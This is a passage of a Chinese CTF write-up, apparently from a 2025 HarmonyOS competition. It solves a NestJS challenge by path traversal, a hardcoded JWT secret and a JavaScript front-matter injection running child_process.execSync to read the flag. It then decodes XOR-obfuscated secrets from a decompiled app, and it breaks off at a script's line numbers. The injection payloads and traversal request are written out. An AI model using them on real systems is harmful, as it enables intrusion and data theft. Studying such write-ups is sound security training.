+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span><span class="nx">JwtModule</span><span class="p">}</span> <span class="kr">from</span> <span class="s2">&#34;@nestjs/jwt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// import { SessionModule } from &#39;@nestjs-plus/sessions&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="o">*</span> <span class="kr">as</span> <span class="nx">cookieParser</span> <span class="kr">from</span> <span class="s1">&#39;cookie-parser&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span><span class="nx">MulterModule</span><span class="p">}</span> <span class="kr">from</span> <span class="s2">&#34;@nestjs/platform-express&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">@Module</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">imports</span><span class="o">:</span> <span class="p">[</span><span class="nx">JwtModule</span><span class="p">.</span><span class="nx">register</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">secret</span><span class="o">:</span> <span class="s1">&#39;sec_y0u_nnnnever_know&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">signOptions</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">expiresIn</span><span class="o">:</span> <span class="s1">&#39;7d&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}),</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">MulterModule</span><span class="p">.</span><span class="nx">register</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">dest</span><span class="o">:</span> <span class="s1">&#39;/opt/uploads&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">controllers</span><span class="o">:</span> <span class="p">[</span><span class="nx">AppController</span><span class="p">,</span> <span class="nx">AdminController</span><span class="p">,],</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">providers</span><span class="o">:</span> <span class="p">[</span><span class="nx">AppService</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">class</span> <span class="nx">AppModule</span> <span class="p">{}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读到<code>secret: 'sec_y0u_nnnnever_know'</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">download</span><span class="err">?</span><span class="n">filename</span><span class="o">=</span><span class="n">upload_1749308551054</span><span class="o">/</span><span class="n">malicious</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">filesystem</span><span class="o">/</span><span class="n">adminconfig</span><span class="o">.</span><span class="n">lock</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;password&#34;: &#34;hArd_Pa@s5_wd&#34;,
+</span></span><span class="line"><span class="cl">  &#34;slogon&#34;: &#34;Keep it up!&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后/admin/login路由登入</p>
+<p>获得jwt令牌，回去看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">renderAdmin</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;未授权&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">decoded</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">jwtService</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">gray</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">gray</span><span class="p">(</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">slogon</span><span class="p">).</span><span class="nx">content</span><span class="p">,</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">decoded</span><span class="p">.</span><span class="nx">username</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">profile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="s2">&#34;info&#34;</span><span class="o">:</span> <span class="nx">profile</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;无效的令牌&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接在jwt里面的slogon注入js代码看看能不能rce,参考https://github.com/simonhaenisch/md-to-pdf/issues/99</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">---js\n((require(\&#34;child_process\&#34;)).execSync(\&#34;ls\&#34;))\n---RCE
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607234031092.png"
+	width="1474"
+	height="719"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607234031092_hu3600809707448506280.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250607234031092_hu9347397849323751725.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250607234031092"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="492px"
+	
+></p>
+<p>后面靶机炸了，换了好几次才搞出来</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608001838727.png"
+	width="1890"
+	height="753"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608001838727_hu7150441637167992344.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608001838727_hu14885150090228160663.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608001838727"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="602px"
+	
+></p>
+<p>无回显考虑写文件到uploads目录下读取,byd那个jwt官网有问题</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004313134.png"
+	width="1522"
+	height="493"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004313134_hu16572957055199086478.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004313134_hu9113413296865195732.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608004313134"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="740px"
+	
+></p>
+<p>然后用前下任意文件读取来读</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004402035.png"
+	width="1918"
+	height="758"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004402035_hu13352918379035187288.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004402035_hu6235506428992313825.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608004402035"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004932834.png"
+	width="1883"
+	height="780"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004932834_hu13780184954924858543.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004932834_hu16079434552318312135.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608004932834"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="579px"
+	
+></p>
+<p>读到flag文件夹下的f1aGG313.txt文件</p>
+<p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004942740.png"
+	width="1856"
+	height="625"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004942740_hu1470046116335853658.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004942740_hu2045157273522272275.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608004942740"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="296"
+		data-flex-basis="712px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">---</span><span class="n">js</span>\<span class="n">n</span><span class="p">((</span><span class="n">require</span><span class="p">(</span>\<span class="s2">&#34;child_process</span><span class="se">\&#34;</span><span class="s2">)).execSync(</span><span class="se">\&#34;</span><span class="s2">cat ../flag/f1aGG313.txt &gt; /data/opt/uploads/1.txt</span><span class="se">\&#34;</span><span class="s2">))</span><span class="se">\n</span><span class="s2">---RCE</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004919287.png"
+	width="1883"
+	height="612"
+	srcset="/p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004919287_hu7162661696232447696.png 480w, /p/2025%E9%B8%BF%E8%92%99ctfwp/image-20250608004919287_hu240084652864505178.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250608004919287"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="307"
+		data-flex-basis="738px"
+	
+></p>
+<h2 id="ezapp_and_server">ezAPP_And_SERVER
+</h2><p>下载附件是hap文件，改zip解压找abc文件，进jadx反编译</p>
+<p>看到utils类的信息，很多混淆的信息丢给ai分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_decode</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;134522123&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    使用XOR运算解码文本
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    参数:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        text: 要解码的文本
+</span></span></span><span class="line"><span class="cl"><span class="s2">        key: 解码密钥 
+</span></span></span><span class="line"><span class="cl"><span class="s2">    
+</span></span></span><span class="line"><span class="cl"><span class="s2">    返回:
+</span></span></span><span class="line"><span class="cl"><span class="s2">        解码后的字符串
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 编码的API路径</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encoded_paths</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;api_user_uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\u001e</span><span class="s2">RD</span><span class="se">\\\u001d</span><span class="s2">D</span><span class="se">\u0000\u001d</span><span class="s2">P^]@TQFB</span><span class="se">\r</span><span class="s2">FXW</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;api_user_verify&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\u001e</span><span class="s2">RD</span><span class="se">\\\u001d</span><span class="s2">D</span><span class="se">\u0000\u001d</span><span class="s2">TTGRYSU&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;解码API路径:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">encoded</span> <span class="ow">in</span> <span class="n">encoded_paths</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="n">xor_decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">encoded</span><span class="si">!r}</span><span class="s2"> -&gt; </span><span class="si">{</span><span class="n">decoded</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># 解码密钥</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="s2">&#34;FpBz</span><span class="se">\u0001</span><span class="s2">ecH</span><span class="se">\n\u001b</span><span class="s2">Ezx</span><span class="se">\u0017</span><span class="s2">@|SrAXQGkloXz</span><span class="se">\u0007</span><span class="s2">ElXZ&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decoded_secret</span> <span class="o">=</span> <span class="n">xor_decode</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">密钥: </span><span class="si">{</span><span class="n">decoded_secret</span><span class="si">!r}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">解码API路径:
+</span></span><span class="line"><span class="cl">api_user_uuid: &#39;\x1eRD\\\x1dD\x00\x1dP^]@TQFB\rFXW\t&#39; -&gt; &#39;/api/v1/contacts?uid=&#39;
+</span></span><span class="line"><span class="cl">api_user_verify: &#39;\x1eRD\\\x1dD\x00\x1dTTGRYSU&#39; -&gt; &#39;/api/v1/getflag&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">密钥: &#39;wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Userlist类里面找到一堆uid</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">obj3</span><span class="p">.</span><span class="na">__username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ObservedPropertySimplePU</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">obj3</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;username&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">Object</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f47ac10b-58cc-4372-a567-0e02b2c3d479&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">2</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;732390b8-ccb6-41de-a93b-94ea059fd263&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">3</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">4</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">5</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;db62356d-3b99-4764-b378-e46cb95df9e6&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">6</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;8f4610ee-ee87-4cca-ad92-6cac4fdbe722&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r24</span><span class="o">[</span><span class="n">7</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createobjectwithbuffer</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;uid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1678d80e-fd4d-4de3-aae2-cb0077f10c21&#34;</span><span class="o">]</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="p">.</span><span class="na">userList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r24</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="p">.</span><span class="na">setInitiallyProvidedValue</span><span class="p">(</span><span class="n">arg1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">obj3</span><span class="p">.</span><span class="na">finalizeConstruction</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">obj3</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面看出有jwt，写脚本爆破jwt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
